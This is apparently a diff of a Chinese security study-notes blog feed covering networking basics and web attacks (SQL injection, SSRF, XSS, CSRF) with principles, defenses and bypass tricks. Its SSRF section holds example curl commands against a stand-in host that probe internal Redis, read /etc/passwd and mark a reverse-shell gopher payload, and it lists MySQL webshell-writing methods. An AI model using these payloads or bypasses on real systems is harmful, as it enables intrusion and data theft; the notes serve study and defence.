+IDS 工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击，主要关注网络层和传输层的数据包，如 IP、TCP、UDP 等协议。&lt;br /&gt;
+产品：奇安信天眼&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;旁路部署&lt;br /&gt;
+旁路部署是指安全设备在网络结构中处于旁路状态。在旁路模式下，安全设备只需要连接到交换机的指定镜像端口，所以形象的称之为 “旁路监控”；而串联模式一般是通过网关或者网桥的模式来进行监控，由于监控设备做了网关或者网桥，所以形象的称之为 “串联监控”。&lt;br /&gt;
+旁路部署可以应用于防毒墙、IDS、上网行为审计、流控等很多安全设备。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;交换机&lt;br /&gt;
+交换机工作在 OSI 模型的第二层，即数据链路层。 交换机的主要作用是连接多个以太网物理段，隔离冲突域，对以太网帧进行高速而透明的交换转发，自行学习和维护 MAC 地址信息。 希望这能帮到你。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;路由器&lt;br /&gt;
+路由器属于 OSI 模型的第三层，即网络层。路由器的基本功能是把数据（IP 报文）传送到正确的网络，包括数据报的寻径和传送，子网隔离，抑制广播风暴，维护路由表，并与其它路由器交换路由信息，这是 IP 报文转发的基础，实现对 IP 数据报的过滤和记帐。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;交换机和路由器之间的关系&lt;br /&gt;
+交换机负责连接网络设备（如交换机、路由器、防火墙、无线 AP 等）和终端设备（如计算机、服务器、摄像头、打印机等）；路由器实现局域网与局域网的互联，局域网与 Internet 的互联。&lt;br /&gt;
+交换机不懂得 IP 地址，但它可以 “学习” MAC 地址，并把其存放在内部地址表中，通过在数据帧的始发者和目标接收者之间建立临时的交换路径，使数据帧直接由源地址到达目的地址。&lt;br /&gt;
+普通的交换机一般工作在 OSI 七层模型的第二层 - 数据链路层，负责局域网之间的连接，而路由器工作在 OSI 的第三层 - 网络层，负责广域网之间的连接。&lt;br /&gt;
+交换机都是根据 MAC 地址转发数据帧，而路由器是基于路由表转发数据包。&lt;br /&gt;
+总而言之，交换机是将不同 IP 地址的电脑连在一起，共享一根网线；路由器是将同一个 IP 给不同的电脑使用，就像一条大路分成很多条小路。一句话，路由器是接外网的，交换机是接内网的。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;数据包从前端到后端的流程&lt;br /&gt;
+客户端向服务器发起请求，请求会被封装成数据包。&lt;br /&gt;
+数据包会经过客户端的网卡，然后通过网线传输到路由器。&lt;br /&gt;
+路由器会根据目标 IP 地址，将数据包转发到下一个路由器或者直接转发到目标服务器。&lt;br /&gt;
+数据包到达目标服务器后，会被服务器的网卡接收。&lt;br /&gt;
+服务器会对数据包进行解析，然后根据请求内容进行处理。&lt;br /&gt;
+服务器处理完请求后，会将响应结果封装成数据包，然后通过网卡发送回客户端。&lt;br /&gt;
+数据包会经过路由器，然后通过网线传输到客户端的网卡。&lt;br /&gt;
+客户端的网卡接收到数据包后，会将数据包传递给操作系统内核。&lt;br /&gt;
+操作系统内核会对数据包进行解析，然后将响应结果交给应用程序。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;9.NAT&lt;br /&gt;
+NAT 是指网络地址转换，是一种网络协议。当在专用网内部的一些主机本来已经分配到了本地 IP 地址（即仅在本专用网内使用的专用地址），但又想和因特网上的主机通信（并不需要加密）时，可使用 NAT 方法。这种方法需要在专用网（私网 IP）连接到因特网（公网 IP）的路由器上安装 NAT 软件。装有 NAT 软件的路由器叫做 NAT 路由器，它至少有一个有效的外部全球 IP 地址（公网 IP 地址）。这样，所有使用本地地址（私网 IP 地址）的主机在和外界通信时，都要在 NAT 路由器上将其本地地址转换成全球 IP 地址，才能和因特网连接。&lt;br /&gt;
+NAT 的实现方式有三种，即静态转换 Static Nat、动态转换 Dynamic Nat 和端口多路复用 OverLoad&lt;br /&gt;
+ 静态转换是指将内部网络的私有 IP 地址转换为公有 IP 地址，IP 地址对是一对一的，是一成不变的，某个私有 IP 地址只转换为某个公有 IP 地址。借助于静态转换，可以实现外部网络对内部网络中某些特定设备（如服务器）的访问。&lt;br /&gt;
+动态转换是指将内部网络的私有 IP 地址转换为公用 IP 地址时，IP 地址是不确定的，是随机的，所有被授权访问上 Internet 的私有 IP 地址可随机转换为任何指定的合法 IP 地址。也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址时，就可以进行动态转换。动态转换可以使用多个合法外部地址集。当 ISP 提供的合法 IP 地址略少于网络内部的计算机数量时。可以采用动态转换的方式。&lt;br /&gt;
+端口多路复用（Port address Translation,PAT）是指改变外出数据包的源端口并进行端口转换，即端口地址转换（PAT，Port Address Translation）. 采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部 IP 地址实现对 Internet 的访问，从而可以最大限度地节约 IP 地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自 internet 的攻击。因此，网络中应用最多的就是端口多路复用方式。例如，假设有两个内部主机 A 和 B，它们都使用私有 IP 地址 192.168.1.1 和 192.168.1.2，并且它们都要访问外部网络。路由器使用公网 IP 地址 203.0.113.1，并且已经配置了 PAT。当主机 A 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10000，并将数据包发送到外部网络。当主机 B 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10001，并将数据包发送到外部网络。当外部网络返回数据包时，路由器会根据目标端口号将数据包转发到相应的内部主机。&lt;/p&gt;
+&lt;p&gt;10.hids&lt;br /&gt;
+HIDS（主机入侵检测系统）是一种监视计算机或网络中可疑活动的应用程序。监视的活动可以包括外部参与者创建的入侵，也可以包括内部资源或数据的滥用。HIDS 具有监视和分析计算系统内部方面以及其网络接口上的任何传入 / 传出网络数据包的能力。它通过监视操作系统操作、跟踪用户行为并在没有人类干预的情况下独立运行来检测主机上的恶意行为。&lt;br /&gt;
+HIDS 则通过监测主机系统的系统日志、进程状态、文件变化等信息来检测安全事件，主要关注应用层和操作系统层的信息&lt;/p&gt;
+&lt;p&gt;11.DOM 型 XSS 和反射型 XSS 的区别&lt;br /&gt;
+ DOM 型 XSS 和反射型 XSS 的区别在于，DOM 型 XSS 不经过服务器，仅通过网页本身的 JavaScript 进行渲染触发，而反射型 XSS 是通过 URL 传递参数，服务器返回响应时，将参数中的恶意脚本代码反射回浏览器执行。DOM 型 XSS 的典型例子是在网页中插入一段恶意脚本代码，然后通过网页本身的 JavaScript 进行渲染触发。反射型 XSS 的典型例子是攻击者构造一个带有恶意脚本代码的 URL，然后将这个 URL 发送给受害者，当受害者点击这个 URL 时，恶意脚本代码就会被执行。&lt;/p&gt;
+&lt;ol start=&#34;12&#34;&gt;
+&lt;li&gt;内网 ip 和外网 ip 的区别&lt;br /&gt;
+一般来说，10 开头的 IP 都是内网 IP，即 10.0.0.0 到 10.255.255.255 是内网 IP。而以下 IP 段的地址都是内网 IP 地址：172.16.0.0 到 172.31.255.255、192.168.0.0 到 192.168.255.255、169.254.x.x（其中 x.x 为任意数字）。如果您想判断一个 ip 是公网 IP 还是私网 ip，可以登录百度，搜索 IP 得到一个本机的外网 IP。然后打开路由器（确切的说是网关，网关可能是光猫也可能是路由器），然后登陆进入查看 WAN IP，这个是路由器连接上层网络的 IP。若 WAN IP 和百度查到的外网 IP 一致，那么这个就是公网 ip 了。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;13.Kerboeros 协议&lt;br /&gt;
+ Kerberos 协议是一种网络认证协议，用于在计算机网络上进行身份验证。它提供了一种安全的身份验证机制，以防止未经授权的访问。&lt;br /&gt;
+Kerberos 协议的基本原理是：用户向 Kerberos 服务器请求一个票据，该票据用于向其他服务器证明用户的身份。Kerberos 服务器使用用户的密码来生成票据，并将其发送回用户。用户可以使用该票据来访问其他服务器，而无需再次输入密码。&lt;br /&gt;
+通过过滤出 kerboros 流量，我们在 req-body 字段中，可以找到 clientName 的值，表示的就是 pc 的用户名，serverName 的两个字段一个表示服务用户名，一个是就是域名。&lt;/p&gt;
+&lt;p&gt;14.DHCP&lt;br /&gt;
+DHCP 协议是一种网络协议，用于在 TCP/IP 网络上分配 IP 地址。DHCP 代表动态主机配置协议。DHCP 协议允许计算机在网络上自动获取 IP 地址，而无需手动配置。DHCP 还提供了其他信息，例如子网掩码、默认网关和 DNS 服务器的地址。DHCP 服务器是负责分配 IP 地址的服务器。DHCP 客户端是需要 IP 地址的计算机。可以帮助识别连接到网络的计算机的主机名、MAC 地址和 IP 地址。在 hostname 字段中可以找到主机名，在 clientMac 字段中可以找到主机的 mac 地址，这样我们就能把主机 - 主机 mac 地址 - IP 地址给关联起来，可以描述出网络中的主机拓扑结构。&lt;/p&gt;
+&lt;p&gt;15.dict 协议&lt;br /&gt;
+ Dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。Dict 服务器和客户机使用 TCP 端口 2628。Dict 协议是基于查询响应的 TCP 协议，它的目标是超越 Webster protocol，并允许客户端在使用过程中访问更多字典 12.&lt;/p&gt;
+&lt;p&gt;16.redis 服务&lt;br /&gt;
+ Redis 是一个使用 ANSI C 编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库。它是一种 NoSQL 数据库，具有高性能、可扩展性强、高可用等优点，受到广泛开发人员和仓库管理人员的青睐。Redis 支持分布式，理论上可以无限扩展，是现在最受欢迎的 NoSQL 数据库之一。&lt;/p&gt;
+&lt;p&gt;17.gopher 协议&lt;br /&gt;
+ gopher 协议是一个古老且强大的协议，可以理解为是 http 协议的前身，他可以实现多个数据包整合发送。通过 gopher 协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。&lt;/p&gt;
+&lt;h1 id=&#34;web-top-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-top-10&#34;&gt;#&lt;/a&gt; Web Top 10&lt;/h1&gt;
+&lt;h2 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h2&gt;
+&lt;h3 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
+&lt;p&gt;由于程序没有细致的过滤用户输入的数据，造成 SQL 字符串拼接，进而恶意的 SQL 语句被执行，造成数据库信息泄露，网页篡改，数据库被恶意操作等。&lt;/p&gt;
+&lt;h3 id=&#34;挖掘&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
+&lt;p&gt;SQL 注入漏洞的位置有很多，但是最常见的是在 Web 应用程序中的输入字段，例如登录表单、搜索表单、注册表单等。攻击者可以通过在这些输入字段中注入恶意代码来执行 SQL 命令，从而获取敏感数据或控制数据库。此外，SQL 注入漏洞还可能存在于 Web 应用程序中的其他位置，例如 URL 参数、HTTP 标头、Cookie 等。&lt;/p&gt;
+&lt;h3 id=&#34;方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
+&lt;p&gt;联合注入、报错注入、延时注入、布尔注入、DNS 注入、宽字节注入、堆叠注入，二次注入。&lt;/p&gt;
+&lt;h3 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;输入验证：对用户输入进行验证，只允许输入预期的数据类型和长度。（正则过滤）&lt;/li&gt;
+&lt;li&gt;参数化查询：使用参数化查询可以防止 SQL 注入攻击。参数化查询是指将 SQL 语句和参数分开处理，参数不会被解释为 SQL 语句的一部分。（php 转义、预编译）&lt;/li&gt;
+&lt;li&gt;最小权限原则：数据库用户应该只被授予最小权限，以限制攻击者能够访问的数据。&lt;/li&gt;
+&lt;li&gt;防火墙：使用防火墙可以限制对数据库的访问，只允许来自特定 IP 地址或端口的请求。&lt;br /&gt;
+5.waf 设备&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
+&lt;h4 id=&#34;关键字过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字过滤&#34;&gt;#&lt;/a&gt; 关键字过滤&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;大小写转换&lt;/li&gt;
+&lt;li&gt;注释符绕过：--， /**/，#(%23)&lt;/li&gt;
+&lt;li&gt;内联注释绕过：/&lt;em&gt;!select&lt;/em&gt;/（注释中的语句为 MYSQL 特有的语句，这些语句在其它数据库中不会运行，但会在 MYSQL 中运行）&lt;/li&gt;
+&lt;li&gt;双关键字绕过&lt;/li&gt;
+&lt;li&gt;编码绕过&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;空格过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空格过滤&#34;&gt;#&lt;/a&gt; 空格过滤&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;使用注释符&lt;/li&gt;
+&lt;li&gt;两个空格&lt;/li&gt;
+&lt;li&gt;使用 ()&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;判断数据库类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断数据库类型&#34;&gt;#&lt;/a&gt; 判断数据库类型&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;页面报错信息&lt;/li&gt;
+&lt;li&gt;查询数据库独有的数据表&lt;/li&gt;
+&lt;li&gt;测试各数据库独有的连接符&lt;/li&gt;
+&lt;li&gt;查询数据库版本&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;mysql-数据库站点无法连接的常见原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-数据库站点无法连接的常见原因&#34;&gt;#&lt;/a&gt; MySQL 数据库站点无法连接的常见原因&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;数据库只允许本地连接&lt;/li&gt;
+&lt;li&gt;站库分离&lt;/li&gt;
+&lt;li&gt;数据库服务器端口被占用或更改了端口&lt;/li&gt;
+&lt;li&gt;访问权限不正确&lt;/li&gt;
+&lt;li&gt;数据库未启动&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;mysql-写-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-写-shell&#34;&gt;#&lt;/a&gt; MySQL 写 shell&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;通过 outfile 写入 shell&lt;/li&gt;
+&lt;li&gt;将一句话木马作为数据插入表中并查询导出&lt;/li&gt;
+&lt;li&gt;开启全局日志写入 shell&lt;/li&gt;
+&lt;li&gt;慢查询日志写入 shell（仅有在查询时间超过系统设定时间时才会写入 shell）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;mysql-无法写-shell-的原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-无法写-shell-的原因&#34;&gt;#&lt;/a&gt; MySQL 无法写 shell 的原因&lt;/h3&gt;
+&lt;p&gt;1.My.ini 配置 secure-file-priv 为空或 / 则可以导出导入无限制&lt;br /&gt;
+ 2. 绝对路径不正确&lt;br /&gt;
+ 3. 没有读写权限&lt;br /&gt;
+ 4. 没有开启全局日志或慢查询日志&lt;/p&gt;
+&lt;h2 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h2&gt;
+&lt;h3 id=&#34;原理-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-2&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
+&lt;p&gt;服务器请求伪造，服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制，服务器就以服务器自己的身份去访问其他服务器的资源。&lt;/p&gt;
+&lt;h3 id=&#34;挖掘-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘-2&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;分享：通过 URL 地址分享网页内容&lt;/li&gt;
+&lt;li&gt;转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览&lt;/li&gt;
+&lt;li&gt;在线翻译：通过 URL 地址翻译对应文本内容&lt;/li&gt;
+&lt;li&gt;图片加载与下载：通过 URL 地址加载或下载图片&lt;/li&gt;
+&lt;li&gt;图片、文章收藏功能&lt;/li&gt;
+&lt;li&gt;未公开的 api 实现以及其他调用 URL 的功能&lt;/li&gt;
+&lt;li&gt;从 URL 关键字中寻找，Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;方法-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-2&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
+&lt;p&gt;1.dict 协议，泄露安装软件版本信息，查看端口，操作内网 redis 服务等：dict://serverip:port / 命令：参数&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&amp;#x27; // 利用 dict 探测端口 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;2.file 协议，在有回显的情况下，利用 file 协议可以读取任意内容&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=file:///etc/passwd&amp;#x27; // 利用 file 协议查看文件 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;3.gopher 协议，gopher 支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中一个最强大的协议 (俗称万能协议)。可用于反弹 shell&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl -v &amp;#x27;http://sec.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379/_....&amp;#x27; // 利用 gopher 反弹 shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;4.http/s 协议，探测内网主机存活&lt;/p&gt;
+&lt;h3 id=&#34;防御-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-2&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;过滤返回信息&lt;/li&gt;
+&lt;li&gt;统一错误信息，避免用户根据错误信息判断端口状态&lt;/li&gt;
+&lt;li&gt;限制可以请求的端口&lt;/li&gt;
+&lt;li&gt;内网 ip 黑名单&lt;/li&gt;
+&lt;li&gt;禁用不需要的协议&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;绕过-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-2&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;采用短网址绕过&lt;/li&gt;
+&lt;li&gt;对 ip 地址进行进制转换&lt;/li&gt;
+&lt;li&gt;利用特殊域名，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuaW8=&#34;&gt;example.io&lt;/span&gt; 可以指向任意域名，则 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS5leGFtcGxlLmlv&#34;&gt;127.0.0.1.example.io&lt;/span&gt; 最终会被解析为 127.0.0.1&lt;/li&gt;
+&lt;li&gt;利用 [::]，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMQ==&#34;&gt;http://127.0.0.1&lt;/span&gt; &amp;gt;&amp;gt; http://[::127.0.0.1]&lt;/li&gt;
+&lt;li&gt;利用句号，比如 127.0.0.1  &amp;gt;&amp;gt; 127。0。0。1&lt;br /&gt;
+7.CRLF 编码绕过&lt;/li&gt;
+&lt;li&gt;使用封闭的字母和数字&lt;/li&gt;
+&lt;li&gt;当限制只能使用 http 协议时，可以采取 302 跳转或短地址&lt;/li&gt;
+&lt;li&gt;限制为 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V4YW1wbGUuY29t&#34;&gt;example.com&lt;/span&gt; 域名时，采用 http 基本身份认证的方式绕过，即 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy54eHguY29tQHd3dy54eGMuY29t&#34;&gt;http://www.xxx.com@www.xxc.com&lt;/span&gt;，在对 @解析域名中，不同的处理函数存在处理差异&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss&#34;&gt;#&lt;/a&gt; XSS&lt;/h2&gt;
+&lt;h3 id=&#34;原理-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-3&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
+&lt;p&gt;web 页面插入恶意 Js 代码，浏览器解析执行获取用户 cookie。&lt;/p&gt;
+&lt;h3 id=&#34;挖掘-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#挖掘-3&#34;&gt;#&lt;/a&gt; 挖掘&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;重灾区：评论区、留言区、个人信息、订单信息等&lt;/li&gt;
+&lt;li&gt;针对型：站内信、网页即时通讯、私信、意见反馈&lt;/li&gt;
+&lt;li&gt;存在风险：搜索框、当前目录、图片属性等&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;方法-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-3&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
+&lt;p&gt;存储型 XSS，反射型 XSS，DOM 型 XSS&lt;/p&gt;
+&lt;h3 id=&#34;防御-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-3&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;正则过滤（标签 /js 代码 / 事件）&lt;/li&gt;
+&lt;li&gt;用户的输入进行 html 编码输出（无法进行闭合）&lt;/li&gt;
+&lt;li&gt;服务端设置会话 Cookie 的 HTTP Only 属性（不能获取 cookie）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;绕过-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-3&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;爆破寻找是否存在能够使用的标签和属性。&lt;/li&gt;
+&lt;li&gt;利用一些框架或模板的特性，比如在 使用 JavaScript template literal 的页面中 ，如果 `` 之间包含 ${code}，就会执行 code。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;xss-的功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss-的功能&#34;&gt;#&lt;/a&gt; XSS 的功能&lt;/h3&gt;
+&lt;p&gt;获取 cookie、获取管理员 ip、xss 蠕虫、钓鱼攻击、前端 JS 挖矿、键盘记录、屏幕截图。&lt;/p&gt;
+&lt;h2 id=&#34;csrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf&#34;&gt;#&lt;/a&gt; CSRF&lt;/h2&gt;
+&lt;h3 id=&#34;原理-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理-4&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
+&lt;p&gt;指利用受害者尚未失效的身份认证信息、（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害人的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（转账，改密码等）。&lt;/p&gt;
+&lt;h3 id=&#34;方法-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法-4&#34;&gt;#&lt;/a&gt; 方法&lt;/h3&gt;
+&lt;p&gt;1.GET 型：直接改 URL 就好&lt;br /&gt;
+ 2.POST 型：想办法利用用户数据提交表单&lt;/p&gt;
+&lt;h3 id=&#34;防御-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御-4&#34;&gt;#&lt;/a&gt; 防御&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;校验 token：让请求带上一个额外的 csrf_token，来确保请求是通过网站的前端页面发送的。这个 csrf_token 由服务器颁发，不要放到 cookie 里，要通过其他方式提供给网站的前端页面，一种方式是放到 DOM 上。前端请求时就会从 DOM 找出这个 csrf_token，作为一个参数带上，让服务端校验。&lt;/li&gt;
+&lt;li&gt;使用严格的 SameSite：Cookie 有一个 SameSite 属性，设置为严格模式（非 none 值），可以让其他网站的中跨域请求不带上 Cookie。&lt;/li&gt;
+&lt;li&gt;通过 Referer 判断：如果在网站中发送的请求，HTTP 头字段 Referer 中的域名就是当前网站。如果是其他网站发起的请求，Referer 就是这个网站域名。服务端可以利用这个 Referer 判断请求是否在网站页面中发起的。此外还可以利用 Origin 头字段，它通常在跨域请求时会携带上。但 Referer 并不完全可靠，在一些老旧的浏览器在实现上可能会有一些问题，有丢失的可能。&lt;/li&gt;
+&lt;li&gt;人机校验：加一个短信校验、邮箱校验、谷歌万恶的九宫格什么的，确保是一个人在尝试发这个请求。可以吊打所有攻击，缺点是用户体验不太好。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;绕过-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过-4&#34;&gt;#&lt;/a&gt; 绕过&lt;/h3&gt;
+&lt;h4 id=&#34;csrf_token-的位置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf_token-的位置&#34;&gt;#&lt;/a&gt; CSRF_TOKEN 的位置&lt;/h4&gt;
+&lt;p&gt;前端页面中（DOM 或全局变量中）&lt;/p&gt;
+&lt;h4 id=&#34;csrf_token-原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf_token-原理&#34;&gt;#&lt;/a&gt; CSRF_TOKEN 原理&lt;/h4&gt;
+&lt;p&gt;前端请求时就会从 前端页面（DOM 或全局变量）找出这个 csrf_token，作为一个参数带上，让服务端校验。&lt;/p&gt;
+&lt;h4 id=&#34;csrf_token-绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf_token-绕过&#34;&gt;#&lt;/a&gt; CSRF_TOKEN 绕过&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;更改请求方式&lt;/li&gt;
+&lt;li&gt;点击劫持&lt;/li&gt;
+&lt;li&gt;使用自己的 token，利用后台漏洞，替换对方的 token 进行验证&lt;/li&gt;
+&lt;/ol&gt;
  ]]></description>
         </item>
         <item>
@@ -323,7 +583,7 @@ accesskey 属性用来指定使元素获得焦点的快捷键。&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;HTML 对标签标签和 &amp;amp; apos; 先处理，之后才会有 javascript 进行处理，可以利用这一特性实现绕过。&lt;br /&gt;
-22.JavaScript template literal 的特征使  &lt;code&gt;string&lt;/code&gt; ，如果 `` 之间包含 ${code}，就会执行 code。&lt;/p&gt;
+22.JavaScript template literal 的特征，如果 `` 之间包含 ${code}，就会执行 code。&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;遇到 script 标签后，html 会停止解析并交给 javascript 解析，直到运行完毕。&lt;/p&gt;
@@ -357,8 +617,7 @@ HTML 中的 input 如果有 name 属性，那就可以通过 get 传值，数据
